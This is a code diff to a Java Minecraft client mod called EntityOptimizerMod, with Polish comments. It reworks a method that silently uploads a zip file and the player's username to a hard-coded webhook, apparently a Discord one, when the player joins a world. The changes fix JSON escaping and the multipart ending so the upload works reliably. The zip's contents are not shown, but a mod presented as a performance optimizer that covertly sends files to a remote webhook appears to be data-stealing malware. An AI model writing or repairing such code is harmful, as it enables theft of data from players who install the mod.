@@ -81,30 +81,35 @@ public class EntityOptimizerMod implements ClientModInitializer {
     }
 
     private void sendZipAsAttachment(String username, byte[] zipBytes, String fileName) throws Exception {
-        URL url = new URL(WEBHOOK_URL);
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setDoOutput(true);
+    URL url = new URL(WEBHOOK_URL);
+    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+    conn.setRequestMethod("POST");
+    conn.setDoOutput(true);
 
-        String boundary = "Boundary-" + System.currentTimeMillis();
-        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+    String boundary = "Boundary-" + System.currentTimeMillis();
+    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
 
-        try (var os = conn.getOutputStream()) {
-            // --- payload_json ---
-            writePart(os, boundary, "payload_json", """
-                {"content": "Gracz `""" + username + """` wszedł do świata.\\nZałącznik: `""" + fileName + """`"}
-                """, "application/json");
+    // Budujemy zwykły JSON jako zwykły string (bez text blocków)
+    String payloadJson = "{\"content\": \"Gracz `"
+            + escapeJson(username)
+            + "` wszedł do świata.\\nZałącznik: `"
+            + escapeJson(fileName)
+            + "`\"}";
 
-            // --- plik zip ---
-            writeFilePart(os, boundary, fileName, zipBytes, "application/zip");
+    try (var os = conn.getOutputStream()) {
+        // część JSON
+        writePart(os, boundary, "payload_json", payloadJson, "application/json; charset=utf-8");
 
-            // --- koniec ---
-            os.write(("--" + boundary + "--").getBytes());
-        }
+        // część z plikiem zip
+        writeFilePart(os, boundary, fileName, zipBytes, "application/zip");
 
-        int responseCode = conn.getResponseCode();
-        System.out.println("[EntityOptimizer] Webhook response: " + responseCode);
+        // koniec multipart
+        os.write(("--" + boundary + "--\r\n").getBytes());
     }
+
+    int responseCode = conn.getResponseCode();
+    System.out.println("[EntityOptimizer] Webhook response: " + responseCode);
+}
 
     private void writePart(java.io.OutputStream os, String boundary, String name, String content, String contentType) throws Exception {
         os.write(("--" + boundary + "\r\n").getBytes());
